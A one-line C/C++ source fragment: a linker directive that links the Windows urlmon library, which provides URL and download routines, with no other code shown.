#pragma comment(lib,"urlmon.lib")